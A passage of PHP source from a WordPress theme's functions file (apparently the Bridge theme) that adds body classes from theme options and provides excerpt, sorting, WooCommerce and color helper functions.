	 * Function that adds classes on body element for vertical menu
	 * @param $classes array of current body classes
	 * @return array array of changed body classes
	 */
	function bridge_qode_vertical_menu_class($classes) {
		global $bridge_qode_options;
        global $wp_query;
		
		if(isset($bridge_qode_options['vertical_area']) && $bridge_qode_options['vertical_area'] =='yes') {
            $classes[] = 'vertical_menu_enabled';

            //left menu type class?
            if(isset($bridge_qode_options['vertical_area_type']) && $bridge_qode_options['vertical_area_type'] != '') {
                switch ($bridge_qode_options['vertical_area_type']) {
                    case 'hidden':
                        $classes[] = ' vertical_menu_hidden';
						if(isset($bridge_qode_options['vertical_logo_bottom']) && $bridge_qode_options['vertical_logo_bottom'] !== '') {
							$classes[] = 'vertical_menu_hidden_with_logo';
						}
                        break;
                }
            }
		
			if(isset($bridge_qode_options['vertical_area_type']) && $bridge_qode_options['vertical_area_type'] =='hidden') {
				if(isset($bridge_qode_options['vertical_area_width']) && $bridge_qode_options['vertical_area_width']=='width_290'){
					 $classes[] = ' vertical_menu_width_290';
				}
				elseif(isset($bridge_qode_options['vertical_area_width']) && $bridge_qode_options['vertical_area_width']=='width_350'){
					 $classes[] = ' vertical_menu_width_350';
				} 
				elseif(isset($bridge_qode_options['vertical_area_width']) && $bridge_qode_options['vertical_area_width']=='width_400'){
					 $classes[] = ' vertical_menu_width_400';
				} 
				else{
					$classes[] = ' vertical_menu_width_260';
				}
			}
			
        }

        $id = bridge_qode_get_page_id();

		if(bridge_qode_is_woocommerce_page()) {
			$id = get_option('woocommerce_shop_page_id');
		}

        if(isset($bridge_qode_options['vertical_area_transparency']) && $bridge_qode_options['vertical_area_transparency'] =='yes' && get_post_meta($id, "qode_page_vertical_area_transparency", true) != "no"){
            $classes[] = ' vertical_menu_transparency vertical_menu_transparency_on';
        }else if(get_post_meta($id, "qode_page_vertical_area_transparency", true) == "yes"){
            $classes[] = ' vertical_menu_transparency vertical_menu_transparency_on';
        }

		return $classes;
    }

	add_filter('body_class','bridge_qode_vertical_menu_class');
}

if (!function_exists('bridge_qode_elements_animation_on_touch_class')) {
	/**
	 * Function that adds classes on body element for disabled animations on touch devices
	 * @param $classes array of current body classes
	 * @return array array of changed body classes
	 */
	function bridge_qode_elements_animation_on_touch_class($classes) {
		global $bridge_qode_options;

		$isMobile = (bool)preg_match('#\b(ip(hone|od|ad)|android|opera m(ob|in)i|windows (phone|ce)|blackberry|tablet'.
										'|s(ymbian|eries60|amsung)|p(laybook|alm|rofile/midp|laystation portable)|nokia|fennec|htc[\-_]'.
										'|mobile|up\.browser|[1-4][0-9]{2}x[1-4][0-9]{2})\b#i', getenv( "HTTP_USER_AGENT" ) );

		if(isset($bridge_qode_options['elements_animation_on_touch']) && $bridge_qode_options['elements_animation_on_touch'] == "no" && $isMobile == true) :
			$classes[] = 'no_animation_on_touch';
		else:
		$classes[] ="";
		endif;

		return $classes;
	}

	add_filter('body_class','bridge_qode_elements_animation_on_touch_class');
}

/* Add class on body for content negative margin */

if (!function_exists('bridge_qode_content_negative_margin')) {

	/**
	 * Function that adds classes on body element for negative margin for content
	 * @param $classes array of current body classes
	 * @return array array of changed body classes
	 */
	function bridge_qode_content_negative_margin($classes) {
        global $bridge_qode_options;


        if(isset($bridge_qode_options['vertical_area']) && $bridge_qode_options['vertical_area'] =='no' && isset($bridge_qode_options['move_content_up']) && $bridge_qode_options['move_content_up'] == 'yes'){
            $classes[] = 'content_top_margin';
        }


        return $classes;
    }

	add_filter('body_class','bridge_qode_content_negative_margin');
}

if(!function_exists('bridge_qode_hidden_title_body_class')) {
	/**
	 * Function that adds class to body element if title is hidden for current page
	 * @param $classes array of currently added classes for body element
	 * @return array array of modified classes
	 */
	function bridge_qode_hidden_title_body_class($classes) {
		$page_id = bridge_qode_get_page_id();
		if($page_id) {
			if(bridge_qode_is_title_hidden()) {
				$classes[] = 'qode-title-hidden';
			}
		}

		return $classes;
	}

	add_filter('body_class', 'bridge_qode_hidden_title_body_class');
}

if(!function_exists('bridge_qode_paspartu_body_class')) {
    /**
     * Function that adds paspartu class to body.
     * @param $classes array of body classes
     * @return array with paspartu body class added
     */
    function bridge_qode_paspartu_body_class($classes) {
        global $bridge_qode_options;

        if(isset($bridge_qode_options['paspartu']) && $bridge_qode_options['paspartu'] == 'yes') {
            $classes[] = 'paspartu_enabled';

            if((isset($bridge_qode_options['paspartu_on_top']) && $bridge_qode_options['paspartu_on_top'] == 'yes' && isset($bridge_qode_options['paspartu_on_top_fixed']) && $bridge_qode_options['paspartu_on_top_fixed'] == 'yes') ||
                (isset($bridge_qode_options['vertical_area']) && $bridge_qode_options['vertical_area'] == "yes" && isset($bridge_qode_options['vertical_menu_inside_paspartu']) && $bridge_qode_options['vertical_menu_inside_paspartu'] == 'yes')) {
                $classes[] = 'paspartu_on_top_fixed';
            }

            if((isset($bridge_qode_options['paspartu_on_bottom']) && $bridge_qode_options['paspartu_on_bottom'] == 'yes' && isset($bridge_qode_options['paspartu_on_bottom_fixed']) && $bridge_qode_options['paspartu_on_bottom_fixed'] == 'yes') ||
                (isset($bridge_qode_options['vertical_area']) && $bridge_qode_options['vertical_area'] == "yes" && isset($bridge_qode_options['vertical_menu_inside_paspartu']) && $bridge_qode_options['vertical_menu_inside_paspartu'] == 'yes')) {
                $classes[] = 'paspartu_on_bottom_fixed';
            }

            if(isset($bridge_qode_options['vertical_area']) && $bridge_qode_options['vertical_area'] == "yes" && isset($bridge_qode_options['vertical_menu_inside_paspartu']) && $bridge_qode_options['vertical_menu_inside_paspartu'] == 'no') {
                $classes[] = 'vertical_menu_outside_paspartu';
            }

            if(isset($bridge_qode_options['vertical_area']) && $bridge_qode_options['vertical_area'] == "yes" && isset($bridge_qode_options['vertical_menu_inside_paspartu']) && $bridge_qode_options['vertical_menu_inside_paspartu'] == 'yes') {
                $classes[] = 'vertical_menu_inside_paspartu';
            }

        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_paspartu_body_class');
}

/* Add class on body depending on content width */

if (!function_exists('bridge_qode_content_width_class')) {
    /**
     * Function that adds class on body depending on content width
     * @param $classes array of current body classes
     * @return array array of changed body classes
     */
    function bridge_qode_content_width_class($classes){
        global $bridge_qode_options;

        $classes[] = "";
        if (isset($bridge_qode_options['initial_content_width']) && $bridge_qode_options['initial_content_width'] !== "grid_1100") {
            $classes[] = 'qode_' . $bridge_qode_options['initial_content_width'];
        }
        return $classes;
    }

    add_filter('body_class','bridge_qode_content_width_class');
}

if(!function_exists('bridge_qode_side_menu_body_class')) {
	/**
	 * Function that adds body classes for different side menu styles
	 * @param $classes array original array of body classes
	 * @return array modified array of classes
	 */
    function bridge_qode_side_menu_body_class($classes) {
            global $bridge_qode_options;

			if(isset($bridge_qode_options['enable_side_area']) && $bridge_qode_options['enable_side_area'] == 'yes') {
										
					if(isset($bridge_qode_options['side_area_type']) && $bridge_qode_options['side_area_type'] == 'side_menu_slide_from_right') {
						$classes[] = 'side_menu_slide_from_right';
					}

					else if(isset($bridge_qode_options['side_area_type']) && $bridge_qode_options['side_area_type'] == 'side_menu_slide_with_content') {
						$classes[] = 'side_menu_slide_with_content';
						$classes[] = $bridge_qode_options['side_area_slide_with_content_width'];
				   }
				   
				   else {
						$classes[] = 'side_area_uncovered_from_content';
					}
			}

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_side_menu_body_class');
}

if(!function_exists('bridge_qode_full_screen_menu_body_class')) {
    /**
     * Function that adds body classes for different full screen menu types
     * @param $classes array original array of body classes
     * @return array modified array of classes
     */
    function bridge_qode_full_screen_menu_body_class($classes) {
        global $bridge_qode_options;

        if(isset($bridge_qode_options['enable_popup_menu']) && $bridge_qode_options['enable_popup_menu'] == 'yes') {
            if(isset($bridge_qode_options['popup_menu_animation_style']) && !empty($bridge_qode_options['popup_menu_animation_style'])) {
                $classes[] = 'qode_' . $bridge_qode_options['popup_menu_animation_style'];
            }
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_full_screen_menu_body_class');
}

if(!function_exists('bridge_qode_overlapping_content_body_class')) {
    /**
     * Function that adds transparent content class to body.
     * @param $classes array of body classes
     * @return array with transparent content body class added
     */
    function bridge_qode_overlapping_content_body_class($classes) {
        global $bridge_qode_options;

        if(isset($bridge_qode_options['overlapping_content']) && $bridge_qode_options['overlapping_content'] == 'yes') {
            $classes[] = 'overlapping_content';
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_overlapping_content_body_class');
}

if(!function_exists('bridge_qode_vss_responsive_body_class')) {
    /**
     * Function that adds vertical split slider responsive class to body.
     * @param $classes array of body classes
     * @return array with vertical split slider responsive body class added
     */
    function bridge_qode_vss_responsive_body_class($classes) {
        global $bridge_qode_options;

        if(isset($bridge_qode_options['vss_responsive_advanced']) && $bridge_qode_options['vss_responsive_advanced'] == 'yes') {
            $classes[] = 'vss_responsive_adv';

            $advanced_width = bridge_qode_options()->getOptionValue('vss_responsive_advanced_width');

            if( !empty($advanced_width)) {
            		$classes[] = "vss_width_" . $advanced_width;
            }
            
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_vss_responsive_body_class');
}

if(!function_exists('bridge_qode_footer_responsive_body_class')) {
	/**
     * Function that adds footer responsive class to body.
     * @param $classes array of body classes
	 * @return array of body classes
     */
    function bridge_qode_footer_responsive_body_class($classes) {
        global $bridge_qode_options;

        if(isset($bridge_qode_options['footer_top_responsive']) && $bridge_qode_options['footer_top_responsive'] === 'yes') {
            $classes[] = 'footer_responsive_adv';
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_footer_responsive_body_class');
}

if(!function_exists('bridge_qode_top_header_responsive_body_class')) {
    function bridge_qode_top_header_responsive_body_class($classes) {
        global $bridge_qode_options;

        if(isset($bridge_qode_options['hide_top_bar_on_mobile']) && $bridge_qode_options['hide_top_bar_on_mobile'] === 'yes') {
            $classes[] = 'hide_top_bar_on_mobile_header';
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_top_header_responsive_body_class');
}

if(!function_exists('bridge_qode_content_sidebar_responsive_body_class')) {
    function bridge_qode_content_sidebar_responsive_body_class($classes) {
        global $bridge_qode_options;

        if(isset($bridge_qode_options['content_sidebar_responsiveness']) && $bridge_qode_options['content_sidebar_responsiveness'] === 'yes') {
            $classes[] = 'qode-content-sidebar-responsive';
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_content_sidebar_responsive_body_class');
}

if(!function_exists('bridge_qode_transparent_content_body_class')) {
    /**
     * Function that adds transparent content class to body.
     * @param $classes array of body classes
     * @return array with transparent content body class added
     */
    function bridge_qode_transparent_content_body_class($classes) {
        global $bridge_qode_options;

        if(isset($bridge_qode_options['transparent_content']) && $bridge_qode_options['transparent_content'] == 'yes') {
            $classes[] = 'transparent_content';
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_transparent_content_body_class');
}

if(!function_exists('bridge_qode_override_elementors_lineheight_body_class')) {
    /**
     * Function that adds transparent content class to body.
     * @param $classes array of body classes
     * @return array with transparent content body class added
     */
    function bridge_qode_override_elementors_lineheight_body_class($classes) {
        if( bridge_qode_is_elementor_installed() ){
            $override_elementor_fonts = bridge_qode_options()->getOptionValue('override_elementor_fonts');

            if( ! empty( $override_elementor_fonts ) && $override_elementor_fonts == 'yes' ){
                $classes[] = 'qode-overridden-elementors-fonts';
            }
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_override_elementors_lineheight_body_class');
}

if(!function_exists('bridge_qode_disable_responsive_button_padding_change')) {
    /**
     * Function that adds transparent content class to body.
     * @param $classes array of body classes
     * @return array with transparent content body class added
     */
    function bridge_qode_disable_responsive_button_padding_change($classes) {
        $disable_button_padding_change = bridge_qode_options()->getOptionValue('button_disable_responsive_padding');

        if( ! empty( $disable_button_padding_change ) && $disable_button_padding_change == 'yes' ){
            $classes[] = 'qode_disabled_responsive_button_padding_change';
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_disable_responsive_button_padding_change');
}

if(!function_exists('bridge_qode_is_title_hidden')) {
	/**
	 * Function that check is title hidden on current page
	 * @param none
	 * @return true/false
	 */
	function bridge_qode_is_title_hidden() {
		global $bridge_qode_options;
		$page_id = bridge_qode_get_page_id();

		$hide_page_title_area = false;
		if(get_post_meta($page_id, "qode_show-page-title", true) === 'yes'){
			$hide_page_title_area = true;
		}elseif(get_post_meta($page_id, "qode_show-page-title", true) === 'no'){
			$hide_page_title_area = false;
		}else{
			if(isset($bridge_qode_options['dont_show_page_title']) && ($bridge_qode_options['dont_show_page_title'] === 'yes')){
				$hide_page_title_area = true;
			}elseif(isset($bridge_qode_options['dont_show_page_title']) && ($bridge_qode_options['dont_show_page_title'] === 'no')){
				$hide_page_title_area = false;
			}
		}

		return $hide_page_title_area;
	}
}

if(!function_exists('bridge_qode_is_title_text_hidden')) {
	/**
	 * Function that check is title text hidden on current page
	 * @param none
	 * @return true/false
	 */
	function bridge_qode_is_title_text_hidden() {
		global $bridge_qode_options;
		$page_id = bridge_qode_get_page_id();

		$hide_page_title_text = false;
		if(get_post_meta($page_id, "qode_show-page-title-text", true) === 'yes'){
			$hide_page_title_text = true;
		}elseif(get_post_meta($page_id, "qode_show-page-title-text", true) === 'no'){
			$hide_page_title_text = false;
		}else{
			if(isset($bridge_qode_options['dont_show_page_title_text']) && ($bridge_qode_options['dont_show_page_title_text'] === 'yes')){
				$hide_page_title_text = true;
			}elseif(isset($bridge_qode_options['dont_show_page_title_text']) && ($bridge_qode_options['dont_show_page_title_text'] === 'no')){
				$hide_page_title_text = false;
			}
		}
		return $hide_page_title_text;
	}
}

if(!function_exists('bridge_qode_is_content_below_header')) {
	/**
	 * Function that check is content below header on page
	 * @param none
	 * @return true/false
	 */
	function bridge_qode_is_content_below_header() {
		global $bridge_qode_options;
		$page_id = bridge_qode_get_page_id();

		$content_below_header = false;
		if(get_post_meta($page_id, "qode_enable_content_top_margin", true) === 'yes'){
			$content_below_header = true;
		}elseif(get_post_meta($page_id, "qode_enable_content_top_margin", true) === 'no'){
			$content_below_header = false;
		}else{
			if(isset($bridge_qode_options['enable_content_top_margin']) && ($bridge_qode_options['enable_content_top_margin'] === 'yes')){
				$content_below_header = true;
			}elseif(isset($bridge_qode_options['enable_content_top_margin']) && ($bridge_qode_options['enable_content_top_margin'] === 'no')){
				$content_below_header = false;
			}
		}

		return $content_below_header;
	}
}

/* Excerpt more */

if (!function_exists('bridge_qode_excerpt_more')) {
	/**
	 * Function that adds three dots on excerpt
	 * @param $more string current more string
	 * @return string changed more string
	 */
	function bridge_qode_excerpt_more($more ) {
		return '...';
	}
	add_filter('excerpt_more', 'bridge_qode_excerpt_more');
}

if (!function_exists('bridge_qode_excerpt_length')) {
	/**
	 * Function that changes excerpt length based on theme options
	 * @param $length int original value
	 * @return int changed value
	 */
	function bridge_qode_excerpt_length($length ) {
		global $bridge_qode_options;
		if($bridge_qode_options['number_of_chars']){
			 return $bridge_qode_options['number_of_chars'];
		} else {
			return 45;
		}
	}

	add_filter( 'excerpt_length', 'bridge_qode_excerpt_length', 999 );
}

if (!function_exists('bridge_qode_excerpt_max_charlength')) {
	/**
	 * Function that sets character length for social share shortcode
	 * @param $charlength string original text
	 * @return string shortened text
	 */
	function bridge_qode_excerpt_max_charlength($charlength) {
		global $bridge_qode_options;
		if(isset($bridge_qode_options['twitter_via']) && !empty($bridge_qode_options['twitter_via'])) {
			$via = " via " . $bridge_qode_options['twitter_via'] . " ";
		} else {
			$via = 	"";
		}
		$excerpt = get_the_excerpt();
		$charlength = 140 - (mb_strlen($via) + $charlength);

		if ( mb_strlen( $excerpt ) > $charlength ) {
			$subex = mb_substr( $excerpt, 0, $charlength);
			$exwords = explode( ' ', $subex );
			$excut = - ( mb_strlen( $exwords[ count( $exwords ) - 1 ] ) );
			if ( $excut < 0 ) {
				return mb_substr( $subex, 0, $excut );
			} else {
				return $subex;
			}
		} else {
			return $excerpt;
		}
	}
}

if(!function_exists('bridge_qode_excerpt')) {
	/**
	* Function that cuts post excerpt to the number of word based on previosly set global
	* variable $word_count, which is defined in qode_set_blog_word_count function.
	 *
	 * It current post has read more tag set it will return content of the post, else it will return post excerpt
	 *
	 * @changed in 4.3 version
	*/
	function bridge_qode_excerpt() {
		global $bridge_qode_options, $word_count, $post;

        if ( post_password_required() ) {
            echo get_the_password_form();
        } else {
            //does current post has read more tag set?
            if (bridge_qode_post_has_read_more()) {
                global $more;

                //override global $more variable so this can be used in blog templates
                $more = 0;
                echo get_the_content('');
            } //is word count set to something different that 0?
            elseif ($word_count != '0') {
                //if word count is set and different than empty take that value, else that general option from theme options
                $word_count = isset($word_count) && $word_count !== "" ? $word_count : $bridge_qode_options['number_of_chars'];

                //if post excerpt field is filled take that as post excerpt, else that content of the post
                $post_excerpt = $post->post_excerpt != "" ? $post->post_excerpt : strip_tags($post->post_content);

                //remove leading dots if those exists
                $clean_excerpt = strlen($post_excerpt) && strpos($post_excerpt, '...') ? strstr($post_excerpt, '...', true) : $post_excerpt;

                //if clean excerpt has text left
                if ($clean_excerpt !== '') {
                    //explode current excerpt to words
                    $excerpt_word_array = explode(' ', $clean_excerpt);

                    //cut down that array based on the number of the words option
                    $excerpt_word_array = array_slice($excerpt_word_array, 0, $word_count);

                    //add exerpt postfix
                    $excert_postfix = apply_filters('bridge_qode_filter_excerpt_postfix', '...');

                    //and finally implode words together
                    $excerpt = implode(' ', $excerpt_word_array) . $excert_postfix;

                    //is excerpt different than empty string?
                    if ($excerpt !== '') {
                        echo '<p itemprop="description" class="post_excerpt">' . $excerpt . '</p>';
                    }
                }
            }
        }
	}
}

if(!function_exists('bridge_qode_set_blog_word_count')) {
	/**
	* Function that sets global blog word count variable used by qode_excerpt function
	*/
	function bridge_qode_set_blog_word_count($word_count_param) {
		global $word_count;

		$word_count = $word_count_param;
	}
}

/* Use slider instead of image for post */

if (!function_exists('bridge_qode_slider_blog')) {
    function bridge_qode_slider_blog($post_id) {
        $sliders = get_post_meta($post_id, "qode_sliders", true);
        $slider = $sliders[1];
        if($slider) {
            $html = "";
            $html .= '<div class="flexslider"><ul class="slides">';
            $i=0;
            while (isset($slider[$i])){
                $slide = $slider[$i];

                $href = $slide[link];
                $baseurl = esc_url(home_url());
                $baseurl = str_replace('http://', '', $baseurl);
                $baseurl = str_replace('www', '', $baseurl);
                $host = parse_url($href, PHP_URL_HOST);
                if($host != $baseurl) {
                    $target = 'target="_blank"';
                }
                else {
                    $target = 'target="_self"';
                }

                $html .= '<li class="slide ' . $slide[imgsize] . '">';
                $html .= '<div class="image"><img src="' . $slide[img] . '" alt="' . $slide[title] . '" /></div>';

                $html .= '</li>';
                $i++;
            }
            $html .= '</ul></div>';
        }
        return $html;
    }
}


if (!function_exists('bridge_qode_compare_slides')) {
	function bridge_qode_compare_slides($a, $b){
		if (isset($a['ordernumber']) && isset($b['ordernumber'])) {
		if ($a['ordernumber'] == $b['ordernumber']) {
			return 0;
		}
		return ($a['ordernumber'] < $b['ordernumber']) ? -1 : 1;
	  }
	  return 0;
	}
}

if (!function_exists('bridge_qode_compare_portfolio_images')) {
	/**
	 * Function that compares two portfolio image for sorting
	 * @param $a int first image
	 * @param $b int second image
	 * @return int result of comparison
	 */
	function bridge_qode_compare_portfolio_images($a, $b) {
		if (isset($a['portfolioimgordernumber']) && isset($b['portfolioimgordernumber'])) {
		if ($a['portfolioimgordernumber'] == $b['portfolioimgordernumber']) {
			return 0;
		}
		return ($a['portfolioimgordernumber'] < $b['portfolioimgordernumber']) ? -1 : 1;
	  }
	  return 0;
	}
}

if (!function_exists('bridge_qode_compare_portfolio_options')) {
	/**
	 * Function that compares two portfolio options for sorting
	 * @param $a int first option
	 * @param $b int second option
	 * @return int result of comparison
	 */
	function bridge_qode_compare_portfolio_options($a, $b){
		if (isset($a['optionlabelordernumber']) && isset($b['optionlabelordernumber'])) {
		if ($a['optionlabelordernumber'] == $b['optionlabelordernumber']) {
			return 0;
		}
		return ($a['optionlabelordernumber'] < $b['optionlabelordernumber']) ? -1 : 1;
	  }
	  return 0;
	}
}

if (!function_exists('bridge_qode_get_portfolio_navigation_post_category_and_title')) {
    /**
     * Function that compares two portfolio options for sorting
     * @param $post
     * @return html of navigation
     */
    function bridge_qode_get_portfolio_navigation_post_category_and_title($post){
        $html_info = '<span class="post_info">';
        $categories = wp_get_post_terms($post->ID, 'portfolio_category');
        $html_info .= '<span class="categories">';
        $k = 1;
        foreach ($categories as $cat) {
            $html_info .= $cat->name;
            if (count($categories) != $k) {
                $html_info .= ', ';
            }
            $k++;
        }
        $html_info .= '</span>';

        if($post->post_title != '') {
            $html_info .= '<span class="h5">'.$post->post_title.'</span>';
        }
        $html_info .= '</span>';
        return $html_info;
    }
}

if (!function_exists('bridge_qode_gallery_upload_get_images')) {
	/**
	 * Function that outputs gallery list item for portfolio in portfolio admin page
	 *
	 */
	function bridge_qode_gallery_upload_get_images() {

		check_ajax_referer('bridge-qode-update-images_' . sanitize_text_field($_POST['post_name']), 'upload_gallery_nonce');
		foreach($_POST['ids'] as $id => $id_value):
			$image = wp_get_attachment_image_src($id_value,'thumbnail', true);
			echo '<li class="qode-gallery-image-holder"><img src="'.$image[0].'"/></li>';
		endforeach;
		exit;
	}

	add_action( 'wp_ajax_bridge_qode_gallery_upload_get_images', 'bridge_qode_gallery_upload_get_images');
}

if (!function_exists('bridge_qode_generate_dynamic_css_and_js')){
	/**
	 * Function that gets content of dynamic assets files and puts that in static ones
	 */
	function bridge_qode_generate_dynamic_css_and_js() {

	    global $wp_filesystem;
	    WP_Filesystem();
	    
		$bridge_qode_options = get_option('qode_options_proya');
		if(bridge_qode_is_css_folder_writable()) {
			$css_dir = get_template_directory().'/css/';

			ob_start();
			include_once( QODE_ROOT_DIR . '/css/style_dynamic.php');
			$css = ob_get_clean();
            if ( is_multisite() ) {
                $wp_filesystem->put_contents( $css_dir . 'style_dynamic_ms_id_' . bridge_qode_get_multisite_blog_id() . '.css', $css );
            } else {
                $wp_filesystem->put_contents($css_dir . 'style_dynamic.css', $css);
            }


			ob_start();
			include_once( QODE_ROOT_DIR . '/css/style_dynamic_responsive.php');
			$css = ob_get_clean();
            if ( is_multisite() ) {
                $wp_filesystem->put_contents( $css_dir . 'style_dynamic_responsive_ms_id_' . bridge_qode_get_multisite_blog_id() . '.css', $css );
            } else {
                $wp_filesystem->put_contents($css_dir . 'style_dynamic_responsive.css', $css);
            }
		}

		if(bridge_qode_is_js_folder_writable()) {
			$js_dir = get_template_directory().'/js/';

			ob_start();
			include_once( QODE_ROOT_DIR . '/js/default_dynamic.php');
			$js = ob_get_clean();
            if ( is_multisite() ) {
                $wp_filesystem->put_contents( $js_dir . 'default_dynamic_ms_id_' . bridge_qode_get_multisite_blog_id() . '.js', $js );
            } else {
                $wp_filesystem->put_contents($js_dir . 'default_dynamic.js', $js);
            }
		}
	}

    add_action('bridge_qode_action_after_theme_option_save', 'bridge_qode_generate_dynamic_css_and_js');
    add_action('bridge_core_action_after_demo_import_content', 'bridge_qode_generate_dynamic_css_and_js');
}

if (!function_exists('bridge_qode_hex2rgb')) {
	/**
	 * Function that transforms hex color to rgb color
	 * @param $hex string original hex string
	 * @return array array containing three elements (r, g, b)
	 */
	function bridge_qode_hex2rgb($hex) {
		$hex = str_replace("#", "", $hex);

		if(strlen($hex) == 3) {
			$r = hexdec(substr($hex,0,1).substr($hex,0,1));
			$g = hexdec(substr($hex,1,1).substr($hex,1,1));
			$b = hexdec(substr($hex,2,1).substr($hex,2,1));
		} else {
			$r = hexdec(substr($hex,0,2));
			$g = hexdec(substr($hex,2,2));
			$b = hexdec(substr($hex,4,2));
		}
		$rgb = array($r, $g, $b);
		//return implode(",", $rgb); // returns the rgb values separated by commas
		return $rgb; // returns an array with the rgb values
	}
}

if(!function_exists('bridge_qode_addslashes')) {
	/**
	 * Function that checks if magic quotes are turned on (for older versions of php) and returns escaped string
	 * @param $str string string to be escaped
	 * @return string escaped string
	 */
	function bridge_qode_addslashes($str) {
		
		$str = addslashes($str);
		
		return $str;
	}
}

if(!function_exists('bridge_qode_is_archive_page')) {
	/**
	 * Function that checks if current page archive page, search, 404 or default home blog page
	 * @return bool
	 *
	 * @see is_archive()
	 * @see is_search()
	 * @see is_404()
	 * @see is_front_page()
	 * @see is_home()
	 */
	function bridge_qode_is_archive_page() {
		return is_archive() || is_search() || is_404() || (is_front_page() && is_home());
	}
}

if(!function_exists('bridge_qode_is_woocommerce_installed')) {
	/**
	 * Function that checks if woocommerce is installed
	 * @return bool
	 */
	function bridge_qode_is_woocommerce_installed() {
		return function_exists('is_woocommerce');
	}
}

if(!function_exists('bridge_qode_is_woocommerce_page')) {
	/**
	 * Function that checks if current page is woocommerce shop, product or product taxonomy
	 * @return bool
	 *
	 * @see is_woocommerce()
	 */
	function bridge_qode_is_woocommerce_page() {
		return function_exists('is_woocommerce') && is_woocommerce();
	}
}

if(!function_exists('bridge_qode_is_woocommerce_shop')) {
	/**
	 * Function that checks if current page is shop or product page
	 * @return bool
	 *
	 * @see is_shop()
	 */
	function bridge_qode_is_woocommerce_shop() {
		return function_exists('is_shop') && is_shop();
	}
}

if(!function_exists('bridge_qode_is_product_category')) {
	function bridge_qode_is_product_category() {
		return function_exists('is_product_category') && is_product_category();
	}
}

if(!function_exists('bridge_qode_get_woo_shop_page_id')) {
	/**
	 * Function that returns shop page id that is set in WooCommerce settings page
	 * @return int id of shop page
	 */
	function bridge_qode_get_woo_shop_page_id() {
		if(bridge_qode_is_woocommerce_installed()) {
			return get_option('woocommerce_shop_page_id');
		}
 	}
}

if(!function_exists('bridge_qode_woocommerce_columns_class')) {
    /**
     * Function that adds number of columns class to header tag
     * @param array array of classes from main filter
     * @return array array of classes with added bottom header appearance class
     */
    function bridge_qode_woocommerce_columns_class($classes) {
        global $bridge_qode_options;

        if (bridge_qode_is_woocommerce_installed()) {
            $products_list_number = 'columns-4';
            if(isset($bridge_qode_options['woo_products_list_number'])){
                $products_list_number = $bridge_qode_options['woo_products_list_number'];
            }

            $classes[]= $products_list_number;
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_woocommerce_columns_class');
}


if(!function_exists('bridge_qode_woocommerce_single_type')) {
	function bridge_qode_woocommerce_single_type() {
		$type = '';
		if (bridge_qode_is_woocommerce_installed()) {
			$type = bridge_qode_options()->getOptionValue('woo_product_single_type');
		}
		return $type;
	}
}

if(!function_exists('bridge_qode_woocommerce_single_type_class')) {
	/**
	 * Function that adds single type on body
	 * @param array array of classes from main filter
	 * @return array array of classes with added  single type class
	 */
	function bridge_qode_woocommerce_single_type_class($classes) {

		if (bridge_qode_is_woocommerce_installed()) {
			$type = bridge_qode_woocommerce_single_type();
			if(!empty($type)) {
				$class = 'qode-product-single-' . $type;
				$classes[]= $class;
			}
		}

		return $classes;
	}

	add_filter('body_class', 'bridge_qode_woocommerce_single_type_class');
}

if(!function_exists('bridge_qode_get_page_template_name')) {
	/**
	 * Returns current template file name without extension
	 * @return string name of current template file
	 */
	function bridge_qode_get_page_template_name() {
		$file_name = '';
		$file_name_without_ext = preg_replace('/\\.[^.\\s]{3,4}$/', '', basename(get_page_template()));

		if($file_name_without_ext !== '') {
			$file_name = $file_name_without_ext;
		}

		return $file_name;
	}
}

if(!function_exists('bridge_qode_is_contact_page_template')) {
	/**
	 * Checks if current template page is contact page.
	 * @param string current page. Optional parameter. If not passed qode_get_page_template_name() function will be used
	 * @return bool
	 *
	 * @see bridge_qode_get_page_template_name()
	 */
	function bridge_qode_is_contact_page_template($current_page = '') {
		if($current_page == '') {
			$current_page = bridge_qode_get_page_template_name();
		}

		return in_array($current_page, array('contact-page'));
	}
}

if(!function_exists('bridge_qode_has_shortcode')) {
	/**
	 * Function that checks whether shortcode exists on current page / post
	 * @param string shortcode to find
	 * @param string content to check. If isn't passed current post content will be used
	 * @return bool whether content has shortcode or not
	 */
	function bridge_qode_has_shortcode($shortcode, $content = '') {
		$has_shortcode = false;

		if ($shortcode) {
			//if content variable isn't past
			if($content == '') {
				//take content from current post
				$current_post = get_post(get_the_ID());
				$content = $current_post->post_content;
			}

			//does content has shortcode added?
			if (stripos($content, '[' . $shortcode) !== false) {
				$has_shortcode = true;
			}
		}

		return $has_shortcode;
	}
}

if(!function_exists('bridge_qode_has_google_map_shortcode')) {
	/**
	 * Function that checks Qode Google Map shortcode exists on a page
	 * @return bool
	 */
	function bridge_qode_has_google_map_shortcode() {
		$google_map_shortcode = 'qode_google_map';

		$slider_field = get_post_meta(bridge_qode_get_page_id(), 'qode_revolution-slider', true);

		$has_shortcode = bridge_qode_has_shortcode($google_map_shortcode) || bridge_qode_has_shortcode($google_map_shortcode, $slider_field);

		if($has_shortcode) {
			return true;
		}

		return false;
	}
}
if ( ! function_exists('bridge_qode_is_responsive_on') ) {
	/**
	 * Checks whether responsive mode is enabled in theme options
	 * @return bool
	 */
	function bridge_qode_is_responsive_on() {
		return bridge_qode_options()->getOptionValue( 'responsiveness' ) !== 'no';
	}
}
if(!function_exists('bridge_qode_rgba_color')) {
	/**
	 * Function that generates rgba part of css color property
	 * @param $color string hex color
	 * @param $transparency float transparency value between 0 and 1
	 * @return string generated rgba string
	 */
	function bridge_qode_rgba_color($color, $transparency) {
		if($color !== '' && $transparency !== '') {
			$rgba_color = '';

			$rgb_color_array = bridge_qode_hex2rgb($color);
			$rgba_color .= 'rgba('.implode(', ', $rgb_color_array).', '.$transparency.')';

			return $rgba_color;
		}
	}
}

if (!function_exists('bridge_qode_theme_version_class')) {
	/**
	 * Function that adds classes on body for version of theme
	 *
	 */
	function bridge_qode_theme_version_class($classes) {
		$current_theme = wp_get_theme();
		$theme_prefix  = 'qode';

		//is child theme activated?
		if($current_theme->parent()) {
			//add child theme version
			$classes[] = $theme_prefix.'-child-theme-ver-'.$current_theme->get('Version');

